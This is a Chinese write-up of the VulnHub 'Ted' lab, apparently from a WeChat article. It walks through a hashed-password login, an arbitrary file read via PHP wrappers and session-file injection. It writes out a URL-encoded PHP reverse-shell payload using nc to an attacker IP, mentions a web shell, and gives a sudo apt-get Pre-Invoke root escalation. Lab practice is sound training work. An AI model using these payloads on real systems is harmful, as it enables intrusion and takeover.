> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mJRvcpTDkfMGYqcnP5pkVg)

靶场地址：https://download.vulnhub.com/ted/Ted.7z

靶场设置 使用 VM 打开

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTTovdVUTq3a6vQ4sS2AJuvotTPD4YrjHJhsYfArn0ib1Qj09lvbHicPKg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkT9SVev6013f7Y31wbOSTstLroqSgrEBdMeoOJg3HqzCicEv49f0ZkibeA/640?wx_fmt=png)

扫描靶场网段，得到 ip 地址

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTJ4vic0O4Bz1737jibt9KicSdpVg6KDYiah1NoVdDgU4VnL0p6DicZxL4bDg/640?wx_fmt=png)

访问网址是个登陆框

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTxWJhuzia5pEyFIZo7bunjM5Zon5HIEgdrORUpFibkCGjucoEibJrVs1TQ/640?wx_fmt=png)扫描目录无果后，开始对登录框进行探索。

随便输入个密码后，发现密码或者密码 hash 错误，尝试多样的密码对比图如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTl7corLn70nResg61FTYkWIlHCNTfibPI4GDX8napHxZFthCTPmxHCAg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTFqU3z7cEwQGIeNtcEXUoAucA9FBCnax3Cwibjkmjicia9NJeno61B0Jrg/640?wx_fmt=png)

看来密码是 admin 没错了，然后应该是 hash 加密后访问。

这里耗尽了大量的时间，得出来了结果（还是朋友做出来的，难受）

这里使用的是 sha256 加密，然后加密的字符串，字符转换大写

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTy0oTc7DagKuRYUwe0HvyE1sZVSomtCzzulCy2BOEmypicqb1KVl3SQQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTQzml9MQvUwHhnwVwHssXypvzbv69rf0dTGPo7E0Q5W3MTgRibPBibH9A/640?wx_fmt=png)

在在线网站进行大小写转换

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTIktBWSXINfVUEVlm39T7LczHiaRSltRlAWsm8na4tusCEWWGuGPy33w/640?wx_fmt=png)

一发入魂

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTzIR1hqSMLT3vSJLIwYmsqLZLC2g2SGkHcFzERenUwm5RyktYwcM9Vw/640?wx_fmt=png)

获得下一步提示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTvCdCfRoF9xonmRPTFoasWrMCIiaf4TpMibaEzSpDQltPPcD82Ky4aNsA/640?wx_fmt=png)

在 search 存在任意文件读取

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTxoLRQ4qs7X05Gj098AzwKASxia1NOllibib44PBYmT8Sib9GTcsJEWwrjg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkT1RZRnV0xUI2DOE6oGlEvWL6gU2ylNQicM6k1BZgQs3iczzJSBmXSsfcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTxTNK8y23TYmkCfVgyYB1KfYYalq6H1u1YvjyH12xgmtMFTR95KjkAQ/640?wx_fmt=png)

阅览 cookie.php 发现回显了文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTvcuF4NwBF8p7nRqgxGWGDWq4pupwV1FwRBAmegMPibvMZh2YibpfZzdQ/640?wx_fmt=png)

```
这里有一个authenticate.php
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTHfFha6doAZxzrbI218bZS5kdH6LdHQohWgIaCRfhXMZC0FDuFFRcaQ/640?wx_fmt=png)

正常读取会出现退出登陆的情况，使用 php 伪协议读取到了文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTkxfKrGDdLbzibvIicgNJnaWM5XYprDrVbYlTGyJ3ibibsp19xp0r0B0vQQ/640?wx_fmt=png)

源码如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTtichQsgfkTGTlwT9kAY5qNHWR6PkZH4tLTpYxHGVEWY3yYoyfwn4bRA/640?wx_fmt=png)

同样的方式读取 home

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTa2uP8QJJPCFvaXib6RlYNDGgDHicOyboHD1qh7BT6Wfibib0qNZOKBjlJQ/640?wx_fmt=png)

Home 文件中有这么一句话

$_SESSION['user_pref'] = $_COOKIE['user_pref'];

任意文件读取到 sessions 目录

第一种

写入一句话木马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTE60a6aRLShzwUyA48L3us45Je2SBxiaWrGkFwc9w9AVSLnC30DmAtfw/640?wx_fmt=png)

链接蚁剑

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTsBmDHUf6t3aAicoejMvIBnRmVrxtqdXcSuKFcN8O3oQoQOAeoJ0OmfQ/640?wx_fmt=png)

但是上传不了脚本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTFw3RlqLZsIMQAlBXDdTCA5WEfSia02BMYd47BWVWP2nMmtv21UrPViaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTdBE1VdrtgIzn1JIshaic3NUNicBwCltIFlBfyEebSGRn3ymMSYxlCWvA/640?wx_fmt=png)

一时间不知道咋弄了

第二种

%3C?php%20exec('nc%20192.168.17.128

%202222%20-e%20/bin/bash')%20?%3E

反弹 nc

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkT1zia8C4WGV6hpHP6YibOyGOkt95nIw2iayUbjN8VMlrfG7b4uDaXxKwPQ/640?wx_fmt=png)

回到 sessions 哪里，因为有 nc

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTwEj8n5H2X9AqmnCx1yV3YoGnVjZgNksDd9ial3WicLmVvSef9mXOeoew/640?wx_fmt=png)

对 shell 进行升级

SHELL=/bin/bash script -q /dev/null

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTUz1ZbncUEia8eY0ic4M8GOTKibt0hAeR5tnTQDtCFQ9aicxznR3EbibUFkA/640?wx_fmt=png)

然后卡壳，最终解决如下

记录如下

输入

sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"

提权

![](https://mmbiz.qpic.cn/sz_mmbiz_png/k89AZuPTXhxFyPWXxZL1QWHgXcjtjUkTTKlytWokk5e8RJicHYRPHIbQ7iaveNvfdict5TmibAH9bCnBxILptDY5TA/640?wx_fmt=png)